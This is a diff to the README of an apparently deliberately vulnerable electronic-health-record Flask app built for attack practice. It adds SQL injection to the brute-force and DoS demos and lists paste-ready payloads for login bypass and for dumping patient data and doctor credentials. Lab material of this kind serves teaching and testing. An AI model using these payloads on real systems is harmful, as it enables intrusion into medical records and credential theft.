@@ -6,6 +6,7 @@ This EHR website base version folder contains the original version of the web ap
 ### Two attacks to be implemented in this application:  
 1. Brute force attack
 2. Dos attack (HTTP flooding)
+3. SQL injection attack
 
 ## Program structure
 -- EHR website base version
@@ -32,5 +33,20 @@ This EHR website base version folder contains the original version of the web ap
 3. Navigate to this folder and run the app.py via the "flask run" instruction to open the website.
 4. Run bruteforce.py to run the brute force.
 5. Run dos.py to run the dos attack.
+6. Use SQL injection inputs below to do SQL injection attacks
+
+### SQL injection inputs
+Copy the content within <<>>
+
+Login bypass:
+1. Username and password  <<' OR '1'='1>>
+2. only use username <<yaoming' -->>   without knowing the password
+3. use username <<admin' UNION SELECT * FROM users -->> without knowing the password
+
+Patient search (after login):
+1. <<' OR '1'='1>>: get all patient data without name
+2. <<UNION SELECT password, username FROM Doctor -->>:  get all usernames
+3. <<UNION SELECT username, password FROM Doctor -->>: get all user passwords
+
  
 
